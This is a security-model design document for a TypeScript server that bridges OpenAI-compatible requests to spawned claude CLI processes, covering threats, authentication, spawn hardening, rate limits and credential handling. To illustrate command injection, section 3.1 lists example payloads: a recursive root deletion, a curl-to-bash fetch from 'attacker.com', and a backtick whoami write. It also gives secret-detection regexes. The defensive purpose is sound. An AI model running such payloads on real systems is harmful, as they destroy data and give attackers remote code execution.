# Security Model — claude-cli-api

> Last Updated: 2026-02-25 | Version: 0.1.0 (Pre-implementation)

## Overview

This document defines the security architecture for the claude-cli-api bridge — a
TypeScript REST API server that accepts OpenAI-compatible requests and spawns
`claude` CLI child processes. The system has a uniquely dangerous threat surface:
**arbitrary user text is passed as arguments to a subprocess**. Every design
decision must assume an adversarial client.

---

## 1. Threat Model

### 1.1 Threat Enumeration

| ID | Threat | Severity | Likelihood | Vector |
|----|--------|----------|------------|--------|
| T1 | Command injection via prompt text | **Critical** | High | User-controlled `-p` argument |
| T2 | Command injection via system prompt | **Critical** | Medium | API field → `--system-prompt` |
| T3 | Session hijacking / spoofing | High | Medium | Guessable or intercepted session IDs |
| T4 | Resource exhaustion (fork bomb) | High | High | Unbounded child process spawning |
| T5 | Credential theft | High | Low | Server-side Anthropic API key exposure |
| T6 | Unauthorized API access | High | High | No auth → open relay |
| T7 | Request smuggling / oversize payload | Medium | Medium | Large bodies, malformed JSON |
| T8 | Session data leakage between users | High | Low | Shared session namespace |
| T9 | Log injection / sensitive data in logs | Medium | Medium | Prompt content in log output |
| T10 | Denial of service via slow clients | Medium | Medium | Slowloris, hanging connections |
| T11 | SSRF via prompt content | Low | Low | Claude CLI doesn't make HTTP calls |
| T12 | Information disclosure via errors | Medium | High | Stack traces, internal paths |

### 1.2 Trust Boundaries

```
┌─────────────────────────────────────────────────┐
│  UNTRUSTED: Network / Client                    │
│  - HTTP requests, headers, body content         │
│  - Session IDs from client                      │
│  - All prompt and message content               │
└──────────────────────┬──────────────────────────┘
                       │ Trust Boundary 1: HTTP ingress
                       ▼
┌─────────────────────────────────────────────────┐
│  SERVER: API Process (Node.js)                  │
│  - Request validation & auth                    │
│  - Rate limiting & resource management          │
│  - Session state (server-authoritative)         │
│  - Child process lifecycle                      │
└──────────────────────┬──────────────────────────┘
                       │ Trust Boundary 2: Process spawn
                       ▼
┌─────────────────────────────────────────────────┐
│  CHILD: claude CLI process                      │
│  - Runs with server's user context              │
│  - Has access to server's filesystem            │
│  - Holds Anthropic credentials                  │
└─────────────────────────────────────────────────┘
```

**Critical insight**: Trust Boundary 2 is weak. The child process inherits the
server's user context. There is no OS-level isolation between server and child.
This means the server itself is the primary enforcement point.

---

## 2. Authentication

### 2.1 API Key Authentication

The server MUST require authentication on every request. Recommended approach:

```
Authorization: Bearer sk-<api-key>
```

**Design decisions:**

- **Use Bearer token format** for OpenAI compatibility. Clients already send
  `Authorization: Bearer sk-...` — we accept the same header format.
- **Server-managed API keys** — keys are generated and stored by the server
  operator, NOT forwarded to Anthropic. The claude CLI uses its own separate
  credentials.
- **Key storage** — keys stored as bcrypt/argon2 hashes in a configuration file
  or SQLite database. Never store plaintext keys.
- **Key format** — prefix keys with `sk-cca-` (sk-claude-cli-api) to
  distinguish from OpenAI keys and prevent accidental cross-use.

### 2.2 Authentication Flow

```
Client request
  → Extract Authorization header
  → Reject if missing (401 Unauthorized)
  → Strip "Bearer " prefix
  → Hash and compare against stored keys
  → Reject if no match (401 Unauthorized)
  → Attach client identity to request context
  → Continue to route handler
```

### 2.3 Key Rotation

- Support multiple active keys per client for zero-downtime rotation
- Keys should have optional expiration dates
- Provide an admin endpoint or CLI command for key management (NOT exposed on
  the public API port)

### 2.4 What We Do NOT Do

- We do NOT validate keys against OpenAI's API. Our keys are independent.
- We do NOT forward the client's key to claude CLI. The CLI has its own
  authentication configured server-side.

---

## 3. Command Injection Prevention

**This is the single most critical security concern in the entire system.**

### 3.1 The Threat

User input flows directly into CLI arguments:

```
claude -p "USER_INPUT_HERE" --session-id UUID --output-format json
```

If we use `child_process.exec()` or template strings in a shell command, an
attacker can escape the quoted argument and execute arbitrary commands:

```
"; rm -rf / #
$(curl attacker.com/shell.sh | bash)
`whoami > /tmp/pwned`
```

### 3.2 Mandatory Mitigation: spawn() with Argument Arrays

**NEVER use `child_process.exec()` or `child_process.execSync()`.**

**ALWAYS use `child_process.spawn()` with an argument array:**

```typescript
import { spawn } from "node:child_process";

// CORRECT — arguments are passed as array elements, never interpolated
// into a shell command string. No shell is involved.
const child = spawn("claude", [
  "-p", userPrompt,          // userPrompt is a single argv element
  "--session-id", sessionId,
  "--output-format", "json",
  "--verbose",
], {
  shell: false,  // CRITICAL: explicitly disable shell
  env: sanitizedEnv,
});
```

```typescript
// WRONG — NEVER DO THIS
const child = exec(`claude -p "${userPrompt}" --session-id ${sessionId}`);
// ^^^ Command injection via userPrompt or sessionId
```

**Why this works**: `spawn()` with `shell: false` passes each array element
as a separate `argv` entry to the OS `execve()` syscall. The user's input is
never parsed by a shell. Backticks, `$()`, semicolons, pipes — none of them
have special meaning. They are literal string content in argv.

### 3.3 Additional Spawn Hardening

```typescript
const child = spawn("claude", args, {
  shell: false,                    // No shell interpretation
  env: buildSanitizedEnv(),        // Controlled environment (see §8)
  cwd: "/tmp/claude-workdir",      // Restricted working directory
  timeout: 300_000,                // 5-minute hard kill (see §7)
  stdio: ["pipe", "pipe", "pipe"], // Capture all I/O
  windowsHide: true,               // Irrelevant on macOS/Linux but defensive
});
```

### 3.4 Argument Validation (Defense in Depth)

Even though `spawn()` prevents injection, validate arguments as a second layer:

```typescript
function validateSessionId(id: string): boolean {
  // UUID v4 format only — no shell metacharacters possible
  return /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i
    .test(id);
}

function validateModel(model: string): boolean {
  // Allowlist of known model identifiers
  const allowed = [
    "claude-sonnet-4-6",
    "claude-opus-4-6",
    "claude-haiku-4-5-20251001",
  ];
  return allowed.includes(model);
}
```

### 3.5 Code Review Enforcement

- **Lint rule**: Ban `child_process.exec` and `child_process.execSync` via
  ESLint `no-restricted-imports` or a custom rule.
- **PR check**: Grep for `exec(` and `execSync(` in CI; fail the build if found.

---

## 4. Session Security

### 4.1 Session ID Generation

- Use `crypto.randomUUID()` (Node.js built-in) — produces UUID v4 with 122
  bits of cryptographic randomness.
- **Never accept client-generated session IDs for new sessions.** The server
  generates session IDs; the client receives them.
- For resuming sessions, the client provides a session ID they previously
  received — but we validate it exists server-side.

### 4.2 Session Isolation

```typescript
interface Session {
  id: string;            // UUID v4
  clientId: string;      // Which API key created this session
  createdAt: number;     // Timestamp
  lastAccessedAt: number;
  isActive: boolean;
}
```

**Enforcement rules:**
- A client can ONLY access sessions they created (bound to their API key).
- Session lookups: `WHERE id = ? AND clientId = ?` — always both conditions.
- Attempting to access another client's session returns 404 (not 403, to avoid
  confirming the session exists).

### 4.3 Session Lifecycle

- Sessions expire after configurable inactivity timeout (default: 1 hour).
- Maximum session age: 24 hours regardless of activity.
- Expired sessions are reaped by a background timer.
- Active child processes for expired sessions are killed.

### 4.4 X-Claude-Session-ID Header

- Response-only for new sessions: server returns the generated ID.
- Request header for resumption: client sends the ID back.
- Always validate format (UUID v4 regex) before any lookup.

---

## 5. Input Validation

### 5.1 Request Size Limits

```typescript
// Apply BEFORE JSON parsing to prevent memory exhaustion
app.use(express.json({
  limit: "1mb",    // Maximum request body size
  strict: true,    // Only accept arrays and objects at top level
}));
```

**Rationale for 1 MB**: Claude CLI handles long conversations, but the API
request itself (a single message turn) should not need more than 1 MB. This
prevents memory-based DoS while allowing generous prompt sizes.

### 5.2 Schema Validation

Use a JSON Schema validator (e.g., Ajv) with strict settings:

```typescript
const chatCompletionSchema = {
  type: "object",
  required: ["model", "messages"],
  additionalProperties: false,  // Reject unknown fields
  properties: {
    model: {
      type: "string",
      enum: ["claude-sonnet-4-6", "claude-opus-4-6",
             "claude-haiku-4-5-20251001"],
    },
    messages: {
      type: "array",
      minItems: 1,
      maxItems: 100,  // Reasonable conversation length limit
      items: {
        type: "object",
        required: ["role", "content"],
        additionalProperties: false,
        properties: {
          role: { type: "string", enum: ["system", "user", "assistant"] },
          content: { type: "string", maxLength: 500_000 },
        },
      },
    },
    stream: { type: "boolean" },
    temperature: { type: "number", minimum: 0, maximum: 2 },
    max_tokens: { type: "integer", minimum: 1, maximum: 128_000 },
  },
};
```

**Key principle**: `additionalProperties: false` on EVERY object schema. Reject
anything we don't explicitly expect.

### 5.3 Field-Level Validation

| Field | Validation | Reason |
|-------|-----------|--------|
| `model` | Strict enum allowlist | Prevents unknown model strings |
| `messages[].role` | Enum: system/user/assistant | Prevents unexpected roles |
| `messages[].content` | String, max 500K chars | Prevents memory abuse |
| `stream` | Boolean only | Type safety |
| `temperature` | Number, 0–2 | Match Claude's valid range |
| `max_tokens` | Integer, 1–128000 | Prevent unreasonable values |
| Session ID (header) | UUID v4 regex | Prevents injection in header |

### 5.4 Content-Type Enforcement

- Reject requests without `Content-Type: application/json`.
- Reject requests with mismatched content types.

---

## 6. Rate Limiting

### 6.1 Multi-Layer Rate Limiting

```
Layer 1: Per-IP connection rate    → 60 connections/minute
Layer 2: Per-API-key request rate  → 30 requests/minute (configurable)
Layer 3: Per-API-key concurrency   → 5 simultaneous requests (configurable)
Layer 4: Per-session request rate  → 10 requests/minute
```

### 6.2 Implementation

Use an in-memory rate limiter (e.g., sliding window counter) since this is a
single-process server:

```typescript
interface RateLimitConfig {
  windowMs: number;       // Time window in milliseconds
  maxRequests: number;    // Maximum requests in window
  maxConcurrent: number;  // Maximum simultaneous requests
}

const defaults: Record<string, RateLimitConfig> = {
  perKey: { windowMs: 60_000, maxRequests: 30, maxConcurrent: 5 },
  perSession: { windowMs: 60_000, maxRequests: 10, maxConcurrent: 2 },
  perIp: { windowMs: 60_000, maxRequests: 60, maxConcurrent: 10 },
};
```

### 6.3 Rate Limit Headers

Return standard rate limit headers on every response:

```
X-RateLimit-Limit: 30
X-RateLimit-Remaining: 27
X-RateLimit-Reset: 1740500000
Retry-After: 12          (only on 429 responses)
```

### 6.4 429 Response Format

```json
{
  "error": {
    "message": "Rate limit exceeded. Retry after 12 seconds.",
    "type": "rate_limit_error",
    "code": "rate_limit_exceeded"
  }
}
```

Match OpenAI's error format for client compatibility.

---

## 7. Process Security

### 7.1 Child Process Limits

Every spawned `claude` child process MUST have:

```typescript
const PROCESS_LIMITS = {
  timeoutMs: 300_000,       // 5-minute hard timeout
  maxOutputBytes: 10_000_000, // 10 MB stdout limit
  maxStderrBytes: 1_000_000,  // 1 MB stderr limit
};
```

### 7.2 Timeout Enforcement

```typescript
// Two-phase kill: SIGTERM then SIGKILL
const timer = setTimeout(() => {
  child.kill("SIGTERM");
  setTimeout(() => {
    if (!child.killed) {
      child.kill("SIGKILL");
    }
  }, 5_000); // 5s grace period after SIGTERM
}, PROCESS_LIMITS.timeoutMs);

child.on("exit", () => clearTimeout(timer));
```

### 7.3 Output Buffering Limits

```typescript
let stdoutBytes = 0;
child.stdout.on("data", (chunk: Buffer) => {
  stdoutBytes += chunk.length;
  if (stdoutBytes > PROCESS_LIMITS.maxOutputBytes) {
    child.kill("SIGTERM");
    // Return 502 to client: "Response too large"
  }
});
```

### 7.4 Process Pool

- Track all active child processes in a Map or Set.
- Enforce a global maximum (e.g., 20 concurrent child processes).
- On server shutdown (SIGTERM/SIGINT), kill all children before exiting.
- Periodically scan for orphaned processes (child.exitCode === null after
  expected timeout).

### 7.5 Working Directory Isolation

- Spawn children in a dedicated temporary directory, not the server's root.
- Use `os.tmpdir()` or a configurable path.
- Each session gets its own subdirectory (prevents cross-session filesystem
  interference if claude CLI writes any files).

---

## 8. Credential Management

### 8.1 Anthropic Credentials

The `claude` CLI authenticates to Anthropic's API independently. The server
does NOT manage or forward Anthropic credentials.

**Rules:**
- Anthropic API key is configured server-side (environment variable or Claude
  CLI's own config file).
- The API key MUST NOT be passed as a CLI argument (visible in `ps` output).
- Prefer `ANTHROPIC_API_KEY` environment variable, passed through a sanitized
  env to the child process.

### 8.2 Environment Sanitization

```typescript
function buildSanitizedEnv(): NodeJS.ProcessEnv {
  // Start with minimal environment, NOT process.env
  return {
    PATH: "/usr/local/bin:/usr/bin:/bin",
    HOME: process.env.HOME,
    ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY,
    // Only add variables that claude CLI actually needs
    // DO NOT spread ...process.env — this leaks server secrets
  };
}
```

**Critical**: Do NOT pass `process.env` to child processes. Build a minimal
allowlist of required variables.

### 8.3 Server API Keys

Keys that clients use to authenticate to our server:

- Store as argon2 hashes (preferred) or bcrypt hashes.
- Load from a configuration file or database at startup.
- Never log, never include in error responses.
- Mask in any admin/debug output: `sk-cca-****7f3a`.

### 8.4 Secret Scanning in Responses

Before returning claude CLI output to the client, scan for and redact common
credential patterns:

```typescript
const SECRET_PATTERNS = [
  /sk-[a-zA-Z0-9]{20,}/g,           // Anthropic/OpenAI keys
  /Bearer [a-zA-Z0-9\-._~+/]+=*/g,  // Bearer tokens
  /AKIA[0-9A-Z]{16}/g,              // AWS access keys
  /-----BEGIN [\w ]+ KEY-----/g,     // PEM private keys
];

function redactSecrets(output: string): string {
  let cleaned = output;
  for (const pattern of SECRET_PATTERNS) {
    cleaned = cleaned.replace(pattern, "[REDACTED]");
  }
  return cleaned;
}
```

---

## 9. CORS & Security Headers

### 9.1 CORS Policy

Default to restrictive CORS. The server is an API — not a browser application:

```typescript
// Default: deny all cross-origin requests
// Configurable via environment variable for specific deployments
const corsOptions = {
  origin: process.env.CORS_ALLOWED_ORIGINS?.split(",") || false,
  methods: ["POST", "GET"],
  allowedHeaders: ["Authorization", "Content-Type", "X-Claude-Session-ID"],
  exposedHeaders: [
    "X-Claude-Session-ID",
    "X-RateLimit-Limit",
    "X-RateLimit-Remaining",
    "X-RateLimit-Reset",
  ],
  maxAge: 86400,
  credentials: false, // No cookies
};
```

### 9.2 Security Headers

Apply on EVERY response:

```typescript
app.use((req, res, next) => {
  // Prevent MIME sniffing
  res.setHeader("X-Content-Type-Options", "nosniff");
  // No caching of API responses
  res.setHeader("Cache-Control", "no-store");
  // Prevent framing
  res.setHeader("X-Frame-Options", "DENY");
  // CSP — API returns JSON, not HTML
  res.setHeader("Content-Security-Policy", "default-src 'none'");
  // Disable referrer for any redirects
  res.setHeader("Referrer-Policy", "no-referrer");
  // Strict transport if behind TLS
  if (req.secure) {
    res.setHeader(
      "Strict-Transport-Security",
      "max-age=31536000; includeSubDomains"
    );
  }
  next();
});
```

### 9.3 Request ID Tracking

Generate a unique request ID for every request for correlation:

```typescript
import { randomUUID } from "node:crypto";

app.use((req, res, next) => {
  const requestId = randomUUID();
  req.requestId = requestId;
  res.setHeader("X-Request-ID", requestId);
  next();
});
```

---

## 10. Logging Security

### 10.1 What to Log

- Request method, path, status code, response time
- Client identifier (hashed API key prefix, NOT full key)
- Session ID
- Request ID
- Child process lifecycle events (spawn, exit code, signal)
- Rate limit events (who was throttled, when)
- Authentication failures (IP, timestamp)
- Errors (sanitized — see below)

### 10.2 What to NEVER Log

- Full API keys (log only prefix: `sk-cca-****7f3a`)
- Prompt content / message bodies (contains user PII)
- Authorization header values
- Full error stack traces in production (log to file, not to client)
- Anthropic API keys or credentials
- Response bodies from claude CLI

### 10.3 Structured Logging

```typescript
// GOOD
logger.info({
  event: "request_completed",
  requestId: req.requestId,
  method: "POST",
  path: "/v1/chat/completions",
  clientKeyPrefix: "sk-cca-****7f3a",
  sessionId: "a1b2c3d4-...",
  statusCode: 200,
  durationMs: 1523,
});

// BAD — leaks prompt content and full key
logger.info(`Request from ${apiKey}: ${JSON.stringify(body)}`);
```

### 10.4 Audit Log

Maintain a separate audit log for security-relevant events:

- Authentication successes and failures
- Session creation and expiration
- Rate limit violations
- Unusual patterns (many failed auths from one IP)

---

## 11. TLS / HTTPS

### 11.1 Recommendation: Do NOT Terminate TLS in the Server

The server should listen on plain HTTP by default:

```typescript
const server = http.createServer(app);
server.listen(port, "127.0.0.1"); // Bind to localhost only
```

**Rationale:**
- TLS termination is handled by the reverse proxy (nginx, Caddy, Traefik)
  or load balancer.
- Certificate management belongs in infrastructure, not application code.
- This simplifies the server and avoids certificate rotation complexity.
- Binding to `127.0.0.1` ensures the server is only accessible locally or
  through the proxy.

### 11.2 When Direct TLS Is Needed

If the server must be exposed directly (no reverse proxy), provide optional
TLS support:

```typescript
if (process.env.TLS_CERT_PATH && process.env.TLS_KEY_PATH) {
  const server = https.createServer({
    cert: fs.readFileSync(process.env.TLS_CERT_PATH),
    key: fs.readFileSync(process.env.TLS_KEY_PATH),
    minVersion: "TLSv1.2",
  }, app);
}
```

### 11.3 Network Security

- **Default bind**: `127.0.0.1` (localhost only). Require explicit opt-in to
  bind to `0.0.0.0`.
- **Port**: Default to a non-privileged port (e.g., 3456).
- Document that production deployments MUST use TLS between client and server.

---

## 12. Specific Mitigations Summary

| Threat | Mitigation | Code-Level Action |
|--------|-----------|-------------------|
| T1: Command injection (prompt) | `spawn()` with arg array | Ban `exec()`; ESLint rule; `shell: false` |
| T2: Command injection (system prompt) | `spawn()` with arg array | Same as T1; system prompt is just another argv |
| T3: Session hijacking | UUID v4 + client binding | `crypto.randomUUID()`; session lookup requires clientId match |
| T4: Resource exhaustion | Rate limits + process pool | Per-key concurrency cap; global process max; timeouts |
| T5: Credential theft | Env sanitization + hashing | Minimal env allowlist; argon2 for stored keys; redact in output |
| T6: Unauthorized access | Bearer auth on every request | Middleware rejects missing/invalid keys before routing |
| T7: Oversize payload | Body size limit | `express.json({ limit: "1mb" })` before any handler |
| T8: Session leakage | Client-scoped sessions | `WHERE id = ? AND clientId = ?` on every lookup |
| T9: Log injection | Structured logging + redaction | No prompt content in logs; mask keys; use JSON logger |
| T10: Slow client DoS | Connection timeouts | `server.headersTimeout`; `server.requestTimeout`; `server.keepAliveTimeout` |
| T11: SSRF | Minimal risk (CLI doesn't make HTTP calls) | Monitor; no additional action needed |
| T12: Error disclosure | Generic error responses | Never return stack traces; use error codes; log details server-side |

---

## 13. Security Configuration Defaults

All security settings should be configurable but default to the most
restrictive reasonable values:

```typescript
interface SecurityConfig {
  // Authentication
  requireAuth: true;                  // Cannot be disabled
  keyHashAlgorithm: "argon2id";

  // Rate limiting
  rateLimitPerKey: { windowMs: 60_000; max: 30 };
  rateLimitPerIp: { windowMs: 60_000; max: 60 };
  maxConcurrentPerKey: 5;

  // Process limits
  processTimeoutMs: 300_000;          // 5 minutes
  maxConcurrentProcesses: 20;
  maxOutputBytes: 10_000_000;         // 10 MB

  // Request limits
  maxRequestBodyBytes: 1_048_576;     // 1 MB
  maxMessagesPerRequest: 100;
  maxContentLength: 500_000;          // chars

  // Session
  sessionInactivityTimeoutMs: 3_600_000;  // 1 hour
  sessionMaxAgeMs: 86_400_000;            // 24 hours

  // Network
  bindHost: "127.0.0.1";             // Localhost only by default
  corsOrigin: false;                  // Deny all CORS by default

  // Timeouts
  headersTimeoutMs: 30_000;
  requestTimeoutMs: 300_000;
  keepAliveTimeoutMs: 5_000;
}
```

---

## 14. Security Testing Requirements

### 14.1 Unit Tests

- Verify `spawn()` is used (never `exec()`) — import scanning test
- Verify session isolation — client A cannot access client B's session
- Verify rate limiter behavior at boundaries
- Verify input validation rejects malformed requests
- Verify secret redaction catches all patterns
- Verify environment sanitization strips sensitive variables

### 14.2 Integration Tests

- Send shell metacharacters in prompt and verify they appear literally in
  claude CLI's input (not interpreted)
- Send oversized requests and verify 413 response
- Send requests without auth and verify 401 response
- Send requests with wrong session owner and verify 404 response
- Verify rate limiting kicks in at configured thresholds

### 14.3 Security Linting

- ESLint: `no-restricted-imports` for `child_process.exec`
- ESLint: `no-restricted-globals` for unsafe patterns
- TypeScript strict mode (no `any` types that could bypass validation)
- Dependency audit: `npm audit` in CI

---

## Appendix A: OpenAI Compatibility Security Notes

Since we accept OpenAI-formatted requests, clients may send fields we don't
support (e.g., `functions`, `tools`, `logprobs`). Our schema validation with
`additionalProperties: false` will reject these. This is intentional — we
accept only the subset we implement, reducing attack surface.

If broader compatibility is needed later, add fields explicitly to the schema
with proper validation. Never use a permissive schema to "pass through"
unknown fields.

## Appendix B: Dependency Security

- Pin all dependencies to exact versions in `package.json`.
- Run `npm audit` in CI; fail on high/critical vulnerabilities.
- Minimize dependency count. This is a focused server — avoid large frameworks
  when small, auditable libraries suffice.
- Prefer Node.js built-in modules where possible (`node:crypto`,
  `node:child_process`, `node:http`).
